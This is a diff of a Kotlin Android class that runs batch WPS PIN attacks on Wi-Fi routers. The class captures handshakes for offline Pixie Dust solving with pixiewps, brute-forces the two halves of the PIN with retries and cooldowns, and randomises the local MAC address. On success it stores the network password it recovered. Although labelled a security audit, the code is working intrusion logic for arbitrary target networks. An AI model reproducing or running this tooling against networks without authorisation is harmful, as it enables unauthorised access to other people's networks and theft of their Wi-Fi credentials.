@@ -11,7 +11,6 @@ import java.util.UUID
 import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.LinkedBlockingQueue
 import java.util.concurrent.TimeUnit
-import kotlin.math.pow
 
 /**
  * 弱 PIN、随机数缺陷漏洞与本次批量 PIN 尝试结果评估。
@@ -20,8 +19,10 @@ import kotlin.math.pow
  * 串行执行，进度在每次尝试后写回历史。PIN 生成方式见 [WpsSecurityAuditTaskInput]。
  *
  * 结果分类：任何阶段取得网络密码即视为路由器失守并结束该网络，不要求完整协议结束。
- * 未取得密码时，WPS_FAIL 按配置重试，收到 M5 的事实用于确认前半段，WSC_NACK 用于正常拒绝。
- * 不用 M 消息编号推断错误；其他异常按配置重试当前 PIN 并指数冷却，重试用尽后推进游标。
+ * 收到 M5 的事实用于确认前半段并转入后三位枚举；除此之外的结果一律算单次异常，
+ * 包括 WSC_NACK、WPS-FAIL、超时与未进入握手，全部按配置重试当前 PIN 并指数冷却，
+ * 重试用尽后才推进游标。脚本会把 NACK 的具体原因（前/后半段不匹配、CONFIG_ERROR）
+ * 一并回传，仅用于日志与展示，不参与游标推进判断。
  */
 internal class WpsSecurityAuditTask(
     input: WpsSecurityAuditTaskInput,
@@ -33,15 +34,30 @@ internal class WpsSecurityAuditTask(
 ) : ServiceTask {
     @Volatile private var config = input.config
     private val updates = LinkedBlockingQueue<TaskUpdatePayload>()
-    private val entries = input.targets.map { Entry(it, config) }
+    private val entries = input.targets.map { Entry(it, config) }.toMutableList()
+    private val queuedTargets = ConcurrentHashMap.newKeySet<String>().apply { addAll(entries.map { it.key }) }
+    @Volatile private var accepting = true
     private val solver = WpsPixieSolver(terminals)
     private val stoppedNetworks = ConcurrentHashMap.newKeySet<String>()
     private var attemptingEntry: Entry? = null
 
     override fun update(update: TaskUpdateRequest): Boolean {
-        (update.payload as? TaskUpdatePayload.SecurityAuditRemove)?.let { stoppedNetworks.add(it.ssid) }
-        synchronized(updates) { updates.offer(update.payload) }
-        return true
+        synchronized(updates) {
+            if (!accepting) return false
+            when (val payload = update.payload) {
+                is TaskUpdatePayload.WpsSecurityAuditAdd -> {
+                    val keys = payload.targets.map { wpsAuditTargetKey(it.ssid, it.mac) }
+                    if (keys.any { it in queuedTargets }) return false
+                    queuedTargets.addAll(keys)
+                    keys.forEach(stoppedNetworks::remove)
+                }
+                is TaskUpdatePayload.SecurityAuditRemove -> stoppedNetworks.add(wpsAuditTargetKey(payload.ssid, payload.mac))
+                is TaskUpdatePayload.WpsSecurityAuditConfigure -> config = payload.config
+                else -> return false
+            }
+            updates.offer(update.payload)
+            return true
+        }
     }
 
     override fun run(context: TaskContext) {
@@ -60,14 +76,18 @@ internal class WpsSecurityAuditTask(
                     drainUpdates(context)
                     val active = entries.filter { it.record.active }
                     if (active.isEmpty()) {
+                        synchronized(updates) {
+                            if (updates.isNotEmpty()) return@synchronized
+                            accepting = false
+                        }
+                        if (accepting) continue
                         context.log("运行队列为空，本批 WPS 安全测试结束")
                         return
                     }
-                    val now = SystemClock.elapsedRealtime()
-                    val next = active.filter { it.readyAt <= now }.minByOrNull { it.lastAttemptAt }
+                    val next = SecurityAuditQueue.next(active)
                     if (next == null) {
                         publish(context)
-                        updates.poll((active.minOf { it.readyAt } - now).coerceIn(1, 100), TimeUnit.MILLISECONDS)
+                        updates.poll(SecurityAuditQueue.waitMillis(active), TimeUnit.MILLISECONDS)
                             ?.let { applyUpdate(it, context) }
                         continue
                     }
@@ -88,6 +108,7 @@ internal class WpsSecurityAuditTask(
                 }
             }
         } finally {
+            accepting = false
             runCatching { session.close() }
                 .onFailure { context.log("关闭 WPS 会话失败：${it.message ?: it.javaClass.name}") }
             entries.filter { it.record.active }.forEach {
@@ -138,7 +159,7 @@ internal class WpsSecurityAuditTask(
         val result = try {
             session.run(JSONObject().put("mode", "pin").put("mac", targetMac).put("pin", pin)
                 .put("localMac", localMac ?: JSONObject.NULL).put("completeProtocol", true),
-                changed = { entry.record.ssid in stoppedNetworks })
+                changed = { entry.key in stoppedNetworks })
         } catch (stop: InterruptedException) {
             throw stop
         } catch (error: Exception) {
@@ -155,7 +176,9 @@ internal class WpsSecurityAuditTask(
             handshakeProgress = null,
             averageAttemptMillis = if (entry.costs.size >= 5) entry.costs.sum() / entry.costs.size else null,
         )
-        context.log("[${entry.record.ssid}] 本轮结果=${result.status}")
+        context.log("[${entry.record.ssid}] 本轮结果=${result.status}，M 消息进度=M${result.maxMMessage}" + result.failure?.let {
+            "，原因=${it.code}${if (it.detail.isEmpty()) "" else " · ${it.detail}"}"
+        }.orEmpty())
         // success 表示完整协议结果；已取得密码的安全结论独立于协议是否正常结束。
         result.network?.let { network ->
             entry.pendingPin = null
@@ -163,8 +186,6 @@ internal class WpsSecurityAuditTask(
             entry.record = entry.record.copy(state = SecurityAuditNetworkState.SUCCEEDED,
                 phase = WpsSecurityAuditPhase.DONE, password = network.password,
                 pin = pin, passwordFoundPhase = entry.record.phase,
-                nDayVerdict = if (entry.record.phase == WpsSecurityAuditPhase.FAIRY_DUST &&
-                    entry.record.vulnPin == pin) true else entry.record.nDayVerdict,
                 handshake = result.handshake ?: entry.record.handshake,
                 retryCount = 0,
                 nextAttemptAt = null, message = "已取得密码，路由器失守，建议立即更换")
@@ -177,8 +198,8 @@ internal class WpsSecurityAuditTask(
         checkNetworkRunning(entry, context)
         // 仙尘阶段先抓握手数据，再交给 pixiewps 离线计算随机数缺陷漏洞 PIN。
         if (entry.record.phase == WpsSecurityAuditPhase.FAIRY_DUST) captureHandshake(entry, result, context)
+        val reason = failureLabel(result.failure)
         when {
-            result.status == WPS_FAIL -> retryOrAdvance(entry, context, selectedConfig)
             // 收到 M5 即前半段正确，前四位确定后转入后三位枚举。
             result.firstHalfValid && entry.record.firstHalf == null -> {
                 entry.readyAt = 0
@@ -189,12 +210,26 @@ internal class WpsSecurityAuditTask(
                     nextAttemptAt = null, message = "排队中")
                 context.log("[${entry.record.ssid}] 前四位已确定：${pin.take(4)}")
             }
-            // PIN 正常被拒：直接推进游标，不重试也不冷却。
-            result.status == WSC_NACK -> advance(entry)
-            // 超时、WPS-FAIL、未进入握手：按配置重试当前 PIN 并指数冷却。
-            else -> retryOrAdvance(entry, context, selectedConfig)
+            // 未推进到 M5 的结果（含 WSC_NACK）一律算单次异常：重试当前 PIN 并指数冷却。
+            else -> retryOrAdvance(entry, context, selectedConfig, reason)
         }
         publish(context)
+    }
+
+    /** 把脚本回传的失败短码翻译成展示用的异常类型。 */
+    private fun failureLabel(failure: WpsFifoSession.Failure?): String = when {
+        failure == null -> "未进入握手"
+        failure.code == "WSC_NACK_FIRST_HALF" -> "NACK：PIN 前半段不匹配"
+        failure.code == "WSC_NACK_SECOND_HALF" -> "NACK：PIN 后半段不匹配"
+        failure.code.startsWith("WSC_NACK_CONFIG_") ->
+            "NACK：路由器返回配置错误 ${failure.code.removePrefix("WSC_NACK_CONFIG_")}"
+        failure.code == "WPS_TIMEOUT" -> "WPS 超时"
+        failure.code == "WPS_OVERLAP" -> "WPS 重叠冲突"
+        failure.code == "WPS_FAIL" -> "WPS-FAIL"
+        failure.code == "SUPPPLICANT_REJECT" -> "supplicant 拒绝命令"
+        failure.code == "EXCLUDED_AP" -> "目标在排除名单"
+        failure.code == "EXCEPTION" -> "执行异常"
+        else -> failure.code
     }
 
     /** 仙尘阶段：用第一次握手的完整数据离线计算漏洞 PIN，只算一次。 */
@@ -208,25 +243,25 @@ internal class WpsSecurityAuditTask(
             updatedAt = System.currentTimeMillis())
         publish(context)
         val solved = solver.solve(handshake, context) { checkNetworkRunning(entry, context) }
-        entry.record = entry.record.copy(vulnPin = solved, nDayVerdict = solved != null)
+        entry.record = entry.record.copy(vulnPin = solved)
         context.log(
             if (solved != null) "[${entry.record.ssid}] pixiewps 解出漏洞 PIN：$solved"
             else "[${entry.record.ssid}] pixiewps 未能解出漏洞 PIN，继续枚举",
         )
     }
 
-    private fun retryOrAdvance(entry: Entry, context: TaskContext, selectedConfig: WpsSecurityAuditConfig) {
+    private fun retryOrAdvance(entry: Entry, context: TaskContext, selectedConfig: WpsSecurityAuditConfig, reason: String) {
         val count = entry.record.retryCount + 1
-        if (count > retryBudget(selectedConfig)) {
-            context.log("[${entry.record.ssid}] 异常重试已用尽，推进游标")
+        if (SecurityAuditQueue.retryExhausted(selectedConfig.retryCount, count)) {
+            context.log("[${entry.record.ssid}] $reason，重试已用尽，推进游标")
             advance(entry)
         } else {
             val delay = cooldownMillis(selectedConfig, count)
-            entry.readyAt = entry.lastAttemptAt + delay
+            entry.readyAt = SecurityAuditQueue.readyAt(entry.lastAttemptAt, delay)
             entry.record = entry.record.copy(retryCount = count,
                 state = if (delay > 0) SecurityAuditNetworkState.COOLDOWN else SecurityAuditNetworkState.QUEUED,
-                message = "握手异常，第 $count 次重试",
-                nextAttemptAt = System.currentTimeMillis() + (entry.readyAt - SystemClock.elapsedRealtime()).coerceAtLeast(0))
+                message = "$reason，第 $count 次重试",
+                nextAttemptAt = SecurityAuditQueue.displayTime(entry.readyAt))
         }
     }
 
@@ -267,10 +302,6 @@ internal class WpsSecurityAuditTask(
         context.log("[${entry.record.ssid}] 达到尝试上限 $limit，提前结束")
     }
 
-    /** WPS 审计任务中 6 同样按 6 次重试处理，避免异常网络无限停滞。 */
-    private fun retryBudget(selectedConfig: WpsSecurityAuditConfig): Int =
-        selectedConfig.retryCount.coerceIn(0, 6)
-
     /** 纯读取；游标推进与重试判定由 [advance] / [retryOrAdvance] 负责。 */
     private fun currentPin(entry: Entry): String? = when (entry.record.phase) {
         WpsSecurityAuditPhase.FAIRY_DUST -> when {
@@ -298,20 +329,24 @@ internal class WpsSecurityAuditTask(
 
     private fun applyUpdate(payload: TaskUpdatePayload, context: TaskContext) {
         when (payload) {
+                is TaskUpdatePayload.WpsSecurityAuditAdd -> {
+                    entries.addAll(payload.targets.map { Entry(it, config) })
+                    context.log("已追加 ${payload.targets.size} 个 WPS 测试网络")
+                }
                 is TaskUpdatePayload.WpsSecurityAuditConfigure -> {
                     config = payload.config
                     entries.filter { it.record.active }.forEach {
                         it.record = it.record.copy(config = config)
                         if (it.record.retryCount > 0) {
-                            it.readyAt = it.lastAttemptAt + cooldownMillis(config, it.record.retryCount)
-                            it.record = it.record.copy(nextAttemptAt = System.currentTimeMillis() +
-                                (it.readyAt - SystemClock.elapsedRealtime()).coerceAtLeast(0))
+                            it.readyAt = SecurityAuditQueue.readyAt(it.lastAttemptAt, cooldownMillis(config, it.record.retryCount))
+                            it.record = it.record.copy(nextAttemptAt = SecurityAuditQueue.displayTime(it.readyAt),
+                                state = if (it.readyAt > SystemClock.elapsedRealtime()) SecurityAuditNetworkState.COOLDOWN else SecurityAuditNetworkState.QUEUED)
                         }
                     }
                     context.log("WPS 安全测试配置已更新")
                 }
                 is TaskUpdatePayload.SecurityAuditRemove -> entries
-                    .filter { it.record.active && it.record.ssid == payload.ssid }
+                    .filter { it.record.active && it.key == wpsAuditTargetKey(payload.ssid, payload.mac) }
                     .forEach { stopEntry(it, context) }
                 else -> Unit
         }
@@ -320,7 +355,7 @@ internal class WpsSecurityAuditTask(
 
     private fun checkNetworkRunning(entry: Entry, context: TaskContext) {
         context.ensureRunning()
-        if (entry.record.ssid in stoppedNetworks) throw NetworkStoppedException()
+        if (entry.key in stoppedNetworks) throw NetworkStoppedException()
     }
 
     private fun stopEntry(entry: Entry, context: TaskContext) {
@@ -333,8 +368,13 @@ internal class WpsSecurityAuditTask(
 
     private class NetworkStoppedException : RuntimeException()
 
-    private fun publish(context: TaskContext) =
+    private fun publish(context: TaskContext) {
+        synchronized(updates) {
+            queuedTargets.retainAll(entries.filter { it.record.active }.map { it.key } +
+                updates.filterIsInstance<TaskUpdatePayload.WpsSecurityAuditAdd>().flatMap { it.targets.map { target -> wpsAuditTargetKey(target.ssid, target.mac) } })
+        }
         context.publishAuditNetworks(config, entries.map { it.record })
+    }
 
     private fun describe(entry: Entry, pin: String, localMac: String?): String {
         val prefix = when (entry.record.phase) {
@@ -376,7 +416,7 @@ internal class WpsSecurityAuditTask(
         (1..6).joinToString(":") { "%02x".format(SECURE_RANDOM.nextInt(256) and 0xfc or 0x02) }
 
     private fun cooldownMillis(selectedConfig: WpsSecurityAuditConfig, retries: Int): Long =
-        if (retries > 0) 2.0.pow(retries.toDouble() - 1).toLong() * selectedConfig.cooldownBaseMillis else 0
+        SecurityAuditQueue.cooldownMillis(selectedConfig.cooldownBaseMillis, retries)
 
     /** 第二阶段 PIN：四位前缀 + `000` + 七位校验位。 */
     private fun firstHalfPin(index: Int): String =
@@ -399,32 +439,30 @@ internal class WpsSecurityAuditTask(
         return (10 - accum % 10) % 10
     }
 
-    private class Entry(target: WpsSecurityAuditTarget, config: WpsSecurityAuditConfig) {
+    private class Entry(target: WpsSecurityAuditTarget, config: WpsSecurityAuditConfig) : SecurityAuditQueueEntry {
+        val key = wpsAuditTargetKey(target.ssid, target.mac)
+        override val active get() = record.active
         var record = AuditRecord.Wps(
             id = UUID.randomUUID().toString(), ssid = target.ssid, config = config,
             startedAt = System.currentTimeMillis(), updatedAt = System.currentTimeMillis(),
             state = SecurityAuditNetworkState.QUEUED, mac = target.mac,
-            phase = target.resumePhase, vulnPin = target.resumeVulnPin,
+            phase = target.resumePhase,
             firstHalf = target.resumeFirstHalf, firstHalfIndex = target.resumeFirstHalfIndex,
             secondHalfIndex = target.resumeSecondHalfIndex,
         )
         var localMac: String? = null
         /** 重试时锁定的 PIN；推进游标后清空，由 [currentPin] 重新计算。 */
         var pendingPin: String? = null
-        var lastAttemptAt = 0L
-        var readyAt = 0L
+        override var lastAttemptAt = 0L
+        override var readyAt = 0L
         val costs = mutableListOf<Long>()
-        var fairyProbeTried = target.resumePhase != WpsSecurityAuditPhase.FAIRY_DUST ||
-            target.resumeVulnPin != null
+        var fairyProbeTried = target.resumePhase != WpsSecurityAuditPhase.FAIRY_DUST
         var fairyVulnTried = target.resumePhase != WpsSecurityAuditPhase.FAIRY_DUST
-        var solverTried = target.resumePhase != WpsSecurityAuditPhase.FAIRY_DUST ||
-            target.resumeVulnPin != null
+        var solverTried = target.resumePhase != WpsSecurityAuditPhase.FAIRY_DUST
     }
 
     private companion object {
         val SECURE_RANDOM = java.security.SecureRandom()
-        const val WSC_NACK = "WSC_NACK"
-        const val WPS_FAIL = "WPS_FAIL"
         const val FAIRY_PIN = "76970009"//TODO:12345670
         const val FIRST_HALF_COUNT = 10000
         const val SECOND_HALF_COUNT = 1000
